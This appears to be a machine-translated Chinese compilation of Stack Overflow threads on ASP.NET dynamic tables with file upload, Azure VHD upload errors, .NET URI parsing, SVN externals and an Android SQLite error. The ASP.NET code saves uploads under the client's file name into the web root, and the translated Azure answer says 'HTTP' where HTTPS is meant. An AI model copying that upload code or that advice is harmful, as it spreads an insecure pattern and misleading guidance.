    }
}

protected void Page_Load(object sender, EventArgs e)
{
    if (Page.IsPostBack)
    {            
        if (CTflag == false)
        {
            this.Rows = tblRow;
            this.Columns = tblCol;                
            CreateDynamicTable();                
        }
        else
        {                
            CTflag = true;                
        }
    }
    //LoadViewState(object this);
    //CreateDynamicTable();
}
protected void Button1_Click(object sender, EventArgs e)
{        
    clrControls();
    CreateDynamicTable(); 
}

protected void CreateDynamicTable()
{        
    tblRow = Convert.ToInt32(DropDownList1.SelectedValue);

    //Creat the Table and Add it to the Page    
    if (CTflag == false)
    {            
        table.Caption = "Challan Entry";
        table.ID = "Challan Entry";
        table.BackColor = System.Drawing.Color.BurlyWood;
        Page.Form.Controls.Add(table);

        // Now iterate through the table and add your controls
        for (i = 0; i < 1; i++)
        {
            row = new TableRow();
            row.BorderStyle = BorderStyle.Ridge;

            for (j = 0; j <= tblCol; j++)
            {
                cell = new TableCell();
                cell.BorderWidth = 5;
                cell.BorderStyle = BorderStyle.Ridge;
                cell.BorderColor = System.Drawing.Color.Azure;
                for (j = 0; j <= tblCol; j++)
                {
                    string[] Header = { "CC NO.", "DATE", "TotalAmt", "NoOfRecpt", "Energy", "New", "Theft", "Misc", "SelectFile", "Upload", "Status" };
                    Label lbl = new Label();
                    lbl.ID = "lblHeader" + j;
                    if (j == 8)
                    {
                        lbl.Width = 220;
                    }
                    else if (j == 9)
                    {
                        lbl.Width = 50;
                    }
                    else
                    {
                        lbl.Width = 100;
                    }
                    lbl.Text = Header[j];

                    // Add the control to the TableCell
                    cell.Controls.Add(lbl);
                }
                row.Cells.Add(cell);
            }

            // Add the TableRow to the Table
            table.Rows.Add(row);
        }
        for (i = 0; i < tblRow; i++)
        {
            row = new TableRow();
            row.ID = tbRowId + i;
            row.BorderStyle = BorderStyle.Ridge;

            for (j = 0; j <= tblCol; j++)
            {
                cell = new TableCell();
                cell.ID = tbColId + i + j;
                cell.BorderWidth = 5;
                cell.BorderStyle = BorderStyle.Ridge;
                cell.BorderColor = System.Drawing.Color.Azure;
                for (j = 0; j <= 0; j++)
                {
                    Label lbl = new Label();
                    lbl.ID = "lblCCRow" + i + "Col" + j;
                    lbl.Text = "CC NO. " + i + " ";
                    lbl.Width = 100;
                    // Add the control to the TableCell
                    cell.Controls.Add(lbl);
                }
                for (j = 1; j <= 1; j++)
                {
                    Label lbl = new Label();
                    lbl.ID = "lblRow" + i + "Col" + j;
                    lbl.Width = 100;
                    lbl.Text = Convert.ToString(DateTime.Now.Day) + "/" + Convert.ToString(DateTime.Now.Month) + "/" + Convert.ToString(DateTime.Now.Year);
                    // Add the control to the TableCell
                    cell.Controls.Add(lbl);
                }
                for (j = 2; j <= 7; j++)
                {
                    tb = new TextBox();
                    tb.Width = 100;
                    tb.ID = "txtBoxRow" + i + "Col" + j;
                    //txtbxNames[i,j] = Convert.ToString(tb.ID);
                    tb.Text = "0";
                    // Add the control to the TableCell
                    cell.Controls.Add(tb);
                }
                for (j = 8; j <= 8; j++)
                {
                    fileUp = new FileUpload();
                    //m = i; n = j;
                    fileUp.ID = filename + i + j;
                    fileUp.Width = 220;
                    cell.Controls.Add(fileUp);
                    cmdArg = fileUp.ID;

                    UpLdButton = new Button();
                    UpLdButton.Width = 100;
                    UpLdButton.Text = "Upload" + i + j;
                    UpLdButton.ID = UpLdButton.Text;
                    UpLdButton.CommandArgument= cmdArg;
                    cell.Controls.Add(UpLdButton);

                    UpLdButton.Click += new EventHandler(UpLdButton_Click);
                }
                for (j = 9; j <= 9; j++)
                {
                    Label lbl = new Label();
                    lbl.ID = "lblRow" + i + j;
                    lbl.Text = "[ Status ]";
                    lbl.Width = 100;
                    // Add the control to the TableCell
                    cell.Controls.Add(lbl);
                }
                row.Cells.Add(cell);
            }
            // Add the TableRow to the Table
            table.Rows.Add(row);
        } //outer for-loop end

        for (i = 0; i < 1; i++)
        {
            rrow = new TableRow();
            rrow.ID = "ResultRow";
            rrow.BorderStyle = BorderStyle.Ridge;                

            for (j = 0; j <= tblCol; j++)
            {
                rcell = new TableCell();
                rcell.ID = "resultCol" + j;
                rcell.BorderWidth = 5;
                rcell.BorderStyle = BorderStyle.Ridge;
                rcell.BorderColor = System.Drawing.Color.Azure;
                for (j = 0; j <= 0; j++)
                {
                    Label lbl = new Label();
                    //lbl.ID = "lblCCRow" + i + "Col" + j;
                    lbl.Text = "<b>Total</b>";
                    lbl.Width = 100;
                    // Add the control to the TableCell
                    rcell.Controls.Add(lbl);
                }
                for (j = 1; j <= 1; j++)
                {
                    Label lbl = new Label();
                    //lbl.ID = "lblRow" + i + "Col" + j;
                    lbl.Width = 100;
                    lbl.Text = Convert.ToString(DateTime.Now.Day) + "/" + Convert.ToString(DateTime.Now.Month) + "/" + Convert.ToString(DateTime.Now.Year);
                    // Add the control to the TableCell
                    rcell.Controls.Add(lbl);
                }
                for (j = 2; j <= 7; j++)
                {
                    tbr = new Label();
                    tbr.Width = 100;
                    tbr.ID = "txtResult" +i+j;                        
                    tbr.Text = tbr.ID;
                    tbr.EnableTheming = true;
                    tbr.BackColor = System.Drawing.Color.White;
                    //txtResNames[i, j] = Convert.ToString(tbr.ID);
                    // Add the control to the TableCell
                    rcell.Controls.Add(tbr);
                }
                for (j = 8; j <= 8; j++)
                {
                    btnCal = new Button();
                    btnCal.Width = 100;
                    btnCal.Text = "Calculate";
                    btnCal.ID = btnCal.Text;                        
                    rcell.Controls.Add(btnCal);
                    btnCal.Click += new EventHandler(btnCal_Click);
                }

                rrow.Cells.Add(rcell);
            }

            // Add the TableRow to the Table
            table.Rows.Add(rrow);
        }

        //flag seetting
        CTflag = true;
        ViewState["dynamictable"] = true;
    }
}

void btnCal_Click(object sender, EventArgs e)
{
    TextBox tbres = new TextBox();
    TextBox tbTemp = new TextBox();

    double TotAmt = 0, NoofRect = 0, Energy = 0,New1 = 0, Theft = 0, Misc = 0;
    for (int i = 0; i < tblRow; i++)
    {
        for (int j = 2; j <= 7; j++)
        {
            TextBox tb = (TextBox)FindControlRecursive(this, string.Format("txtBoxRow{0}Col{1}", i, j));
            Label tbr = (Label)FindControlRecursive(this, string.Format("txtResult{0}{1}", 0, j));
            switch (j)
            {
                case 2:
                    TotAmt += Convert.ToDouble(tb.Text);
                    Label1.Text = Convert.ToString(TotAmt);
                    tbr.Text = Convert.ToString(TotAmt);
                    break;
                case 3:
                    NoofRect += Convert.ToDouble(tb.Text);
                    //Label1.Text = Convert.ToString(NoofRect);
                    tbr.Text = Convert.ToString(NoofRect);
                    break;
                case 4:
                    Energy+= Convert.ToDouble(tb.Text);
                    //Label1.Text = Convert.ToString(TotAmt);
                    tbr.Text = Convert.ToString(Energy);
                    break;
                case 5:
                    New1+= Convert.ToDouble(tb.Text);
                    //Label1.Text = Convert.ToString(TotAmt);
                    tbr.Text = Convert.ToString(New1);
                    break;
                case 6:
                    Theft+= Convert.ToDouble(tb.Text);
                    //Label1.Text = Convert.ToString(TotAmt);
                    tbr.Text = Convert.ToString(Theft);
                    break;
                case 7:
                    Misc+= Convert.ToDouble(tb.Text);
                    //Label1.Text = Convert.ToString(TotAmt);
                    tbr.Text = Convert.ToString(Misc);
                    break;                    
            }
        }
    }        
}

protected void clrControls()
{
    Label1.Text = "";
    for (int i = 0; i < tblRow; i++)
    {
        for (int j = 2; j <= 7; j++)
        {
            fileUp = (FileUpload)FindControlRecursive(this, string.Format("fileUpLoader{0}{1}", i, 8));
            fileUp.Enabled = true;
            Button btn = (Button)FindControlRecursive(this, string.Format("Upload{0}{1}", i, 8));
            btn.Enabled=true;
            TextBox tb = (TextBox)FindControlRecursive(this, string.Format("txtBoxRow{0}Col{1}", i, j));
            tb.Text = "0";
            Label tbr = (Label)FindControlRecursive(this, string.Format("txtResult{0}{1}", 0, j));
            tbr.Text = "0";
            Label statlbl = new Label();
            statlbl = (Label)FindControlRecursive(this, string.Format("lblRow{0}{1}", i, 9));
            statlbl.Text = "[status]";
        }
    }
    for (i = 0; i < 1; i++)
    {
        for (j = 8; j <= 8; j++)
        {
            btnCal.Enabled = true;
        }
    }
}

protected override void LoadViewState(object earlierState)
{
    base.LoadViewState(earlierState);
    if (ViewState["dynamictable"] == null)
    {
        CreateDynamicTable();            
    }        
}

void UpLdButton_Click(object sender, EventArgs e)
{
    Button btnUpLD = sender as Button;

    for (int i = 0; i < tblRow; i++)
    {
        Button tb = (Button)FindControlRecursive(this, string.Format("Upload{0}{1}", i, 8));
        fileUp = (FileUpload)FindControlRecursive(this, string.Format("fileUpLoader{0}{1}", i, 8));
        Label statlbl = new Label();            
        statlbl = (Label)FindControlRecursive(this, string.Format("lblRow{0}{1}", i, 9));            
        if (!fileUp.HasFile)
        {
            //statlbl.Text = "[status]";
            continue;
        }
        else
        {                
            UploadFile(fileUp,tb);
            if (tb.Enabled == true && fileUp.Enabled == true)
            {
                statlbl.Text = "[status]";
            }
            else
            {
                statlbl.Text = "Uploaded";
            }                
        }        
    }            
}    

protected void DropDownList1_SelectedIndexChanged(object sender, EventArgs e)
{
}

public static Control FindControlRecursive(Control root, string id)
{
    if (root.ID == id)
    {
        return root;
    }

    foreach (Control c in root.Controls)
    {
        Control t = FindControlRecursive(c, id);
        if (t != null)
        {
            return t;
        }
    }
    return null;
}

protected void UploadFile(FileUpload xyz, Button btn)
{        
    if (xyz.HasFile)
    {
        string extension = System.IO.Path.GetExtension(xyz.FileName);
        if (extension == ".dat" || extension == ".B60")
        {
            if (File.Exists(Server.MapPath("~\\") + xyz.FileName))
            {
                Label1.Text = "File " + xyz.FileName + " Already Exists!";
            }
            else
            {
                xyz.PostedFile.SaveAs(Server.MapPath("~\\") + xyz.FileName);
                Label1.Text = "The " + xyz.FileName + " Has been uploaded";
                btn.Enabled = false;
                xyz.Enabled = false;
            }
        }
        else
        {
            Label1.Text = "* You can select only '.dat' & '.B60' type files";
            btn.Enabled = true;
            xyz.Enabled = true;
        }            
    }
    else 
    {        
        Label1.Text = "Select a file";
    }        
}   
} 
```

请帮帮我！！！提前感谢...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T17:29:30.273

为什么不在按钮的命令参数中存储行 ID，然后当单击按钮时，您可以使用它来循环所有行，直到 id 与您要查找的行匹配，例如

```
foreach (DateRow test in table.Rows)
  if ((test.findcontrol(uploadbutton) as Button).commandArgument = (Sender as Button).commandArgumrnt 
{
    //do stuff here 
}
    else
    {
    \\ do nothing
    } 
```

希望这可以帮助

# azure - 无法将 VHD 上传到 azure 失败

> ID：15392168
> 
> 赞同：1
> 
> 时间：2013-03-13T17:20:36.067
> 
> 标签：azure, azure-storage, azure-blob-storage

我正在尝试将 VHD 文件上传到 azure。我正在使用命令行设置连接并开始上传。当它进行上传时，它会计算 HASH，然后它开始上传文件，但随后它失败并出现一条很长的消息。

```
C:\Program Files\Microsoft SDKs\Windows Azure\.NET SDK\2012-10>csupload Add-Pers
istentVMImage -Destination "http://testrli.blob.core.windows.net/test3/EO Testin
g.vhd" -Label "EO Testing.vhd" -LiteralPath "C:\VIRTUALMACHINES\PAT5DB\EO Traini
ng.vhd" -OS Windows
Windows(R) Azure(TM) Upload Tool version 1.8.0.0
for Microsoft(R) .NET Framework 3.5
Copyright (c) Microsoft Corporation. All rights reserved.

Use of http is insecure, can leak data to untrusted viewers and make your   contentvulnerable to data tampering by a malicious third party.
Using the saved connection string...
Using image name 'EOTraining.vhd'
Found existing page blob. Resuming upload...
MD5 hash is being calculated for the file 'C:\VIRTUALMACHINES\PAT5DB\EO Training
.vhd'.
MD5 hash calculation is completed.ning Time: 00:00:01; Throughput: 1344.2Mbps
Elapsed time for the operation: 00:12:27
Upload failed with exceptions:
Microsoft.WindowsAzure.StorageClient.StorageServerException: The server encounte
red an unknown failure: The underlying connection was closed: An unexpected erro
r occurred on a receive. ---> System.Net.WebException: The underlying connection
was closed: An unexpected error occurred on a receive. ---> System.IO.IOExcepti
on: Unable to read data from the transport connection: An existing connection wa
s forcibly closed by the remote host. ---> System.Net.Sockets.SocketException: A
n existing connection was forcibly closed by the remote host
at System.Net.Sockets.NetworkStream.EndRead(IAsyncResult asyncResult)
--- End of inner exception stack trace ---
at System.Net.Sockets.NetworkStream.EndRead(IAsyncResult asyncResult)
at System.Net.Connection.ReadCallback(IAsyncResult asyncResult)
--- End of inner exception stack trace ---
at System.Net.HttpWebRequest.EndGetResponse(IAsyncResult asyncResult)
at Microsoft.WindowsAzure.StorageClient.EventHelper.ProcessWebResponse(WebReq
uest req, IAsyncResult asyncResult, EventHandler`1 handler, Object sender)
--- End of inner exception stack trace ---
at Microsoft.WindowsAzure.StorageClient.Tasks.Task`1.get_Result()
at Microsoft.WindowsAzure.StorageClient.Tasks.Task`1.ExecuteAndWait()
at Microsoft.WindowsAzure.Sync.Upload.BlobSynchronizer.<>c__DisplayClass4.<Sy
nchronize>b__1(DataWithRange dwr, CloudPageBlob b)
at Microsoft.WindowsAzure.Sync.Threading.Parallel.<>c__DisplayClass7`2.<ForEa
ch>b__1(Object )
Microsoft.WindowsAzure.StorageClient.StorageServerException: The server encounte
red an unknown failure: The underlying connection was closed: An unexpected erro
r occurred on a receive. ---> System.Net.WebException: The underlying connection
was closed: An unexpected error occurred on a receive. ---> System.IO.IOExcepti
on: Unable to read data from the transport connection: An existing connection wa
s forcibly closed by the remote host. ---> System.Net.Sockets.SocketException: A
n existing connection was forcibly closed by the remote host
at System.Net.Sockets.NetworkStream.EndRead(IAsyncResult asyncResult)
--- End of inner exception stack trace ---
at System.Net.Sockets.NetworkStream.EndRead(IAsyncResult asyncResult)
at System.Net.Connection.ReadCallback(IAsyncResult asyncResult)
--- End of inner exception stack trace ---
at System.Net.HttpWebRequest.EndGetResponse(IAsyncResult asyncResult)
at Microsoft.WindowsAzure.StorageClient.EventHelper.ProcessWebResponse(WebReq
uest req, IAsyncResult asyncResult, EventHandler`1 handler, Object sender)
--- End of inner exception stack trace ---
at Microsoft.WindowsAzure.StorageClient.Tasks.Task`1.get_Result()
at Microsoft.WindowsAzure.StorageClient.Tasks.Task`1.ExecuteAndWait()
at Microsoft.WindowsAzure.Sync.Upload.BlobSynchronizer.<>c__DisplayClass4.<Sy
nchronize>b__1(DataWithRange dwr, CloudPageBlob b)
at Microsoft.WindowsAzure.Sync.Threading.Parallel.<>c__DisplayClass7`2.<ForEa
ch>b__1(Object )
Microsoft.WindowsAzure.StorageClient.StorageServerException: The server encounte
red an unknown failure: The underlying connection was closed: An unexpected erro
r occurred on a receive. ---> System.Net.WebException: The underlying connection
was closed: An unexpected error occurred on a receive. ---> System.IO.IOExcepti
on: Unable to read data from the transport connection: An existing connection wa
s forcibly closed by the remote host. ---> System.Net.Sockets.SocketException: A
n existing connection was forcibly closed by the remote host
at System.Net.Sockets.NetworkStream.EndRead(IAsyncResult asyncResult)
--- End of inner exception stack trace ---
at System.Net.Sockets.NetworkStream.EndRead(IAsyncResult asyncResult)
at System.Net.Connection.ReadCallback(IAsyncResult asyncResult)
--- End of inner exception stack trace ---
at System.Net.HttpWebRequest.EndGetResponse(IAsyncResult asyncResult)
at Microsoft.WindowsAzure.StorageClient.EventHelper.ProcessWebResponse(WebReq
uest req, IAsyncResult asyncResult, EventHandler`1 handler, Object sender)
--- End of inner exception stack trace ---
at Microsoft.WindowsAzure.StorageClient.Tasks.Task`1.get_Result()
at Microsoft.WindowsAzure.StorageClient.Tasks.Task`1.ExecuteAndWait()
at Microsoft.WindowsAzure.Sync.Upload.BlobSynchronizer.<>c__DisplayClass4.<Sy
nchronize>b__1(DataWithRange dwr, CloudPageBlob b)
at Microsoft.WindowsAzure.Sync.Threading.Parallel.<>c__DisplayClass7`2.<ForEa
ch>b__1(Object )
Microsoft.WindowsAzure.StorageClient.StorageServerException: The server encounte
red an unknown failure: The underlying connection was closed: An unexpected erro
r occurred on a receive. ---> System.Net.WebException: The underlying connection
was closed: An unexpected error occurred on a receive. ---> System.IO.IOExcepti
on: Unable to read data from the transport connection: An existing connection wa
s forcibly closed by the remote host. ---> System.Net.Sockets.SocketException: A
n existing connection was forcibly closed by the remote host
at System.Net.Sockets.NetworkStream.EndRead(IAsyncResult asyncResult)
--- End of inner exception stack trace ---
at System.Net.Sockets.NetworkStream.EndRead(IAsyncResult asyncResult)
at System.Net.Connection.ReadCallback(IAsyncResult asyncResult)
--- End of inner exception stack trace ---
at System.Net.HttpWebRequest.EndGetResponse(IAsyncResult asyncResult)
at Microsoft.WindowsAzure.StorageClient.EventHelper.ProcessWebResponse(WebReq
uest req, IAsyncResult asyncResult, EventHandler`1 handler, Object sender)
--- End of inner exception stack trace ---
at Microsoft.WindowsAzure.StorageClient.Tasks.Task`1.get_Result()
at Microsoft.WindowsAzure.StorageClient.Tasks.Task`1.ExecuteAndWait()
at Microsoft.WindowsAzure.Sync.Upload.BlobSynchronizer.<>c__DisplayClass4.<Sy
nchronize>b__1(DataWithRange dwr, CloudPageBlob b)
at Microsoft.WindowsAzure.Sync.Threading.Parallel.<>c__DisplayClass7`2.<ForEa
ch>b__1(Object )
Microsoft.WindowsAzure.StorageClient.StorageServerException: The server encounte
red an unknown failure: The underlying connection was closed: An unexpected erro
r occurred on a receive. ---> System.Net.WebException: The underlying connection
was closed: An unexpected error occurred on a receive. ---> System.IO.IOExcepti
on: Unable to read data from the transport connection: An existing connection wa
s forcibly closed by the remote host. ---> System.Net.Sockets.SocketException: A
n existing connection was forcibly closed by the remote host
at System.Net.Sockets.NetworkStream.EndRead(IAsyncResult asyncResult)
--- End of inner exception stack trace ---
at System.Net.Sockets.NetworkStream.EndRead(IAsyncResult asyncResult)
at System.Net.Connection.ReadCallback(IAsyncResult asyncResult)
--- End of inner exception stack trace ---
at System.Net.HttpWebRequest.EndGetResponse(IAsyncResult asyncResult)
at Microsoft.WindowsAzure.StorageClient.EventHelper.ProcessWebResponse(WebReq
uest req, IAsyncResult asyncResult, EventHandler`1 handler, Object sender)
--- End of inner exception stack trace ---
at Microsoft.WindowsAzure.StorageClient.Tasks.Task`1.get_Result()
at Microsoft.WindowsAzure.StorageClient.Tasks.Task`1.ExecuteAndWait()
at Microsoft.WindowsAzure.Sync.Upload.BlobSynchronizer.<>c__DisplayClass4.<Sy
nchronize>b__1(DataWithRange dwr, CloudPageBlob b)
at Microsoft.WindowsAzure.Sync.Threading.Parallel.<>c__DisplayClass7`2.<ForEa
ch>b__1(Object )
Microsoft.WindowsAzure.StorageClient.StorageServerException: The server encounte
red an unknown failure: The underlying connection was closed: An unexpected erro
r occurred on a receive. ---> System.Net.WebException: The underlying connection
was closed: An unexpected error occurred on a receive. ---> System.IO.IOExcepti
on: Unable to read data from the transport connection: An existing connection wa
s forcibly closed by the remote host. ---> System.Net.Sockets.SocketException: A
n existing connection was forcibly closed by the remote host
at System.Net.Sockets.NetworkStream.EndRead(IAsyncResult asyncResult)
--- End of inner exception stack trace ---
at System.Net.Sockets.NetworkStream.EndRead(IAsyncResult asyncResult)
at System.Net.Connection.ReadCallback(IAsyncResult asyncResult)
--- End of inner exception stack trace ---
at System.Net.HttpWebRequest.EndGetResponse(IAsyncResult asyncResult)
at Microsoft.WindowsAzure.StorageClient.EventHelper.ProcessWebResponse(WebReq
uest req, IAsyncResult asyncResult, EventHandler`1 handler, Object sender)
--- End of inner exception stack trace ---
at Microsoft.WindowsAzure.StorageClient.Tasks.Task`1.get_Result()
at Microsoft.WindowsAzure.StorageClient.Tasks.Task`1.ExecuteAndWait()
at Microsoft.WindowsAzure.Sync.Upload.BlobSynchronizer.<>c__DisplayClass4.<Sy
nchronize>b__1(DataWithRange dwr, CloudPageBlob b)
at Microsoft.WindowsAzure.Sync.Threading.Parallel.<>c__DisplayClass7`2.<ForEa
ch>b__1(Object )
Microsoft.WindowsAzure.StorageClient.StorageServerException: The server encounte
red an unknown failure: The underlying connection was closed: An unexpected erro
r occurred on a receive. ---> System.Net.WebException: The underlying connection
was closed: An unexpected error occurred on a receive. ---> System.IO.IOExcepti
on: Unable to read data from the transport connection: An existing connection wa
s forcibly closed by the remote host. ---> System.Net.Sockets.SocketException: A
n existing connection was forcibly closed by the remote host
at System.Net.Sockets.NetworkStream.EndRead(IAsyncResult asyncResult)
--- End of inner exception stack trace ---
at System.Net.Sockets.NetworkStream.EndRead(IAsyncResult asyncResult)
at System.Net.Connection.ReadCallback(IAsyncResult asyncResult)
--- End of inner exception stack trace ---
at System.Net.HttpWebRequest.EndGetResponse(IAsyncResult asyncResult)
at Microsoft.WindowsAzure.StorageClient.EventHelper.ProcessWebResponse(WebReq
uest req, IAsyncResult asyncResult, EventHandler`1 handler, Object sender)
--- End of inner exception stack trace ---
at Microsoft.WindowsAzure.StorageClient.Tasks.Task`1.get_Result()
at Microsoft.WindowsAzure.StorageClient.Tasks.Task`1.ExecuteAndWait()
at Microsoft.WindowsAzure.Sync.Upload.BlobSynchronizer.<>c__DisplayClass4.<Sy
nchronize>b__1(DataWithRange dwr, CloudPageBlob b)
at Microsoft.WindowsAzure.Sync.Threading.Parallel.<>c__DisplayClass7`2.<ForEa
ch>b__1(Object )
Microsoft.WindowsAzure.StorageClient.StorageServerException: The server encounte
red an unknown failure: The underlying connection was closed: An unexpected erro
r occurred on a receive. ---> System.Net.WebException: The underlying connection
was closed: An unexpected error occurred on a receive. ---> System.IO.IOExcepti
on: Unable to read data from the transport connection: An existing connection wa
s forcibly closed by the remote host. ---> System.Net.Sockets.SocketException: A
n existing connection was forcibly closed by the remote host
at System.Net.Sockets.NetworkStream.EndRead(IAsyncResult asyncResult)
--- End of inner exception stack trace ---
at System.Net.Sockets.NetworkStream.EndRead(IAsyncResult asyncResult)
at System.Net.Connection.ReadCallback(IAsyncResult asyncResult)
--- End of inner exception stack trace ---
at System.Net.HttpWebRequest.EndGetResponse(IAsyncResult asyncResult)
at Microsoft.WindowsAzure.StorageClient.EventHelper.ProcessWebResponse(WebReq
uest req, IAsyncResult asyncResult, EventHandler`1 handler, Object sender)
--- End of inner exception stack trace ---
at Microsoft.WindowsAzure.StorageClient.Tasks.Task`1.get_Result()
at Microsoft.WindowsAzure.StorageClient.Tasks.Task`1.ExecuteAndWait()
at Microsoft.WindowsAzure.Sync.Upload.BlobSynchronizer.<>c__DisplayClass4.<Sy
nchronize>b__1(DataWithRange dwr, CloudPageBlob b)
at Microsoft.WindowsAzure.Sync.Threading.Parallel.<>c__DisplayClass7`2.<ForEa
ch>b__1(Object )
Elapsed time for upload: 00:02:17 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T17:46:40.957

这里有几点需要注意。

1.  您正在使用 http 端点，因此请使用 HTTP 以避免进一步的警告和并发症，即[https://testrli.blob.core.windows.net/test3/EO](https://testrli.blob.core.windows.net/test3/EO)
2.  请更新您的连接字符串以使用正确的证书

上传正在尝试恢复之前的上传，并且在上传期间连接从服务器端关闭。有时恢复上传可能会出现这些错误，因此重新上传确实有帮助。

另外，我建议使用 Powershell（下载最新的 0.6.11）并启用 $DebugPreference ='Continue' 以通过这种方式在控制台上查看请求和响应，如果您遇到任何问题，您将知道可能的原因。

这是将 VM 上传到 Windows Azure 的 PS 脚本：http: [//michaelwasham.com/2013/01/04/migrate-a-virtual-machine-to-windows-azure-with-powershell/](http://michaelwasham.com/2013/01/04/migrate-a-virtual-machine-to-windows-azure-with-powershell/)

[如果问题仍然存在，还可以向Windows Azure VM 论坛](http://social.msdn.microsoft.com/Forums/en-US/WAVirtualMachinesforWindows/threads)报告您的问题，以获得相应团队的 1:1 支持。

# .net - .Net 4.5 解释合法 URI？

> ID：15392175
> 
> 赞同：0
> 
> 时间：2013-03-13T17:21:11.030
> 
> 标签：.net, string, c#-4.0, url, uri

我可以将以下 URI 放在浏览器中，它会将我带到 Google 并处理请求。

```
http://www.google.com/search?q=Hello%20on%2013.09.8888@2500:39:41%20as%20test%20number%2005 
```

但是，Uri.TryCreate 和 Uri.IsWellFormedUriString 都说这不是合法的 URI。解析这个的最佳方法是什么？对我的用户来说，它看起来“合法”......

谢谢。

# svn - SVN 提交后挂钩以修改外部

> ID：15392176
> 
> 赞同：3
> 
> 时间：2013-03-13T17:21:12.840
> 
> 标签：svn, post-commit, svn-externals, svnsync

我们有一个 Subversion 设置，它相当广泛地使用了 svn:externals（一个项目中有超过 5 个外部引用，虽然大多数在同一个存储库中，但一两个在不同的存储库中但仍在同一服务器上）。目前，svn:externals 属性的设置方式是它们具有引用项目的完整 URL（即“https://[server]:[port]/svn/Repository1/Projects/...）

最近，我使用 svnsync 设置了一个 SVN 镜像，它将我们的存储库备份到外部异地设施。我们需要能够从远程站点的那些镜像存储库中进行只读检出，这似乎在大多数情况下都可以正常工作，除非它尝试拉取外部文件时，它仍然引用我们的本地现场服务器。

不确定这是否是最好的方法，但我想在远程位置设置某种 post-commit 钩子，它会修改 svn:externals 的属性并在这里替换我们本地服务器的主机名那里的远程服务器的主机名。这个钩子会在 svnsync 每次提交之后运行。

理想情况下，我们希望避免在主存储库中修改 svn:externals 属性以不包含服务器名称。

有没有人遇到过这个问题？最好的方法是什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-14T04:05:11.453

您必须了解这`svn:externals`是文件的属性，修改它们需要提交。如果您有一个*mirror*，并且您修改了`svn:external`，那么您正在创建一个新的远程版本并破坏您的镜像。修订将不再排列。

尽管当时这似乎是一个不错的想法，但`svn:externals`在项目中可能非常糟糕。想象一个这样的项目：

```
http://vegibank.com/svn/trunk/project1 
```

我在这个目录上有一个`svn:external`

```
$ svn pset svn:external "^/trunk/project2/foo foo" . 
```

我这样做是因为该`foo`目录是多个项目的共享文件集。

现在，我为 project1 创建一个标签：

```
$ svn cp http://vegibank.com/svn/trunk/project1 http://vegibank.com/svn/tags/1.2.3 
```

看起来不错——除了`project1/foo`目录没有标记。***它与`project2/foo`***.

我对标签的假设是标签永远不会改变，但这不是真的。主干上的工作仍在进行中`project2/foo`，这改变了我的标签所代表的内容。如果我在 1.2.3 版中有一个错误，并且我决定检查我的标签以查看可能是什么问题，我不一定会得到我发布的内容`project1/foo`——我从主干获得最新的。

处理此问题的更好方法是创建一个发布存储库，将各种项目之间通用的代码构建为某种预编译的工件，并让您的项目依赖于该工件的该版本。它最终与依赖于特定版本的 C 程序`libz.so`或依赖于 .1.6 版本的 Java 项目没有什么不同`org.apache.commons.httpd`。

这将消除镜像的使用`svn:externals`并简化您的镜像。您可以镜像发布存储库以及源存储库。

如果您坚持使用`svn:external`，请不要使用完整的 URL。相反，使用相对 URL。

例如，如果你在上面设置了 `svn:external 而不是这个：

```
$ svn pset svn:external "^/trunk/project2/foo foo" . 
```

去做这个：

```
$ svn pset svn:external "../project2/foo foo" .   #property on ^/trunk/project1 
```

现在，如果我创建这样的标签：

```
$ svn cp http://vegibank.com/svn/trunk http://vegibank.com/svn/tags/1.2.3 
```

我同时标记`project1`和`project2`。现在，我`svn:external`指的是`http://vegibank.com/svn/tags/1.2.3/project2/foo`.

您需要的是一种以这种方式强制执行 svn:externals 的方法，并且您可以使用预提交挂钩来拒绝任何具有`svn:external`引用`trunk`or`branches`目录的集合的提交，而无需指定实际修订。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-13T23:16:53.117

你运行的是什么版本的svn？如果您是最新的，您可以避免将主机名放入`svn:externals` [阅读红皮书，](http://svnbook.red-bean.com/en/1.7/svn.advanced.externals.html) 特别是检查从外部开始 `/`

你应该强烈考虑走出`svn:externals`困境......特别是如果链接指向同一个仓库......你的分支和标记更难。我见过很多 svn 实现，而 svn:externals 通常是难闻的气味。

此外，作为一般规则，我认为有一个提交后挂钩来改变开发人员的意图是次优的。虽然在这种情况下你可能会没事。

# android - 表 x 没有 y 列错误。搜索并找不到有效的解决方案

> ID：15392179
> 
> 赞同：0
> 
> 时间：2013-03-13T17:21:19.690
> 
> 标签：android, sqlite

我正在构建一个可以教孩子们如何写作的 Android 应用程序。因此，我需要保存有关每个孩子的某些信息以及带有特定字母的结果。我正处于构建数据库的阶段，并且一直在使用 Youtube 上的教程，但我遇到了很多错误：

```
1) table studentTable has no column named studentSchool
    Error inserting studentSurname=fdfsfdf studentSchool=fdfdfefe studentForname=gdgdfdf
    android.database.sqlite.SQLiteException: table studentTable has no column named studentSchool (code 1): , while compiling: INSERT INTO studentTable(studentSurname,studentSchool,studentForname) VALUES (?,?,?)
        at android.database.sqlite.SQLiteConnection.nativePrepareStatement(Native Method)
        at android.database.sqlite.SQLiteConnection.acquirePreparedStatement(SQLiteConnection.java:882)
        at android.database.sqlite.SQLiteConnection.prepare(SQLiteConnection.java:493)
        at android.database.sqlite.SQLiteSession.prepare(SQLiteSession.java:588)
        at android.database.sqlite.SQLiteProgram.<init>(SQLiteProgram.java:58)
        at android.database.sqlite.SQLiteStatement.<init>(SQLiteStatement.java:31)
        at android.database.sqlite.SQLiteDatabase.insertWithOnConflict(SQLiteDatabase.java:1467)
        at android.database.sqlite.SQLiteDatabase.insert(SQLiteDatabase.java:1339)
        at com.example.letterwriter.Database.createStudentEntry(Database.java:153)
        at com.example.letterwriter.RegStudentActivity.register(RegStudentActivity.java:42)
        at java.lang.reflect.Method.invokeNative(Native Method)
        at java.lang.reflect.Method.invoke(Method.java:511)
        at android.view.View$1.onClick(View.java:3594)
        at android.view.View.performClick(View.java:4204)
        at android.view.View$PerformClick.run(View.java:17355)
        at android.os.Handler.handleCallback(Handler.java:725)
        at android.os.Handler.dispatchMessage(Handler.java:92)
        at android.os.Looper.loop(Looper.java:137)
        at android.app.ActivityThread.main(ActivityThread.java:5041)
        at java.lang.reflect.Method.invokeNative(Native Method)
        at java.lang.reflect.Method.invoke(Method.java:511)
        at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:793)
        at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:560)
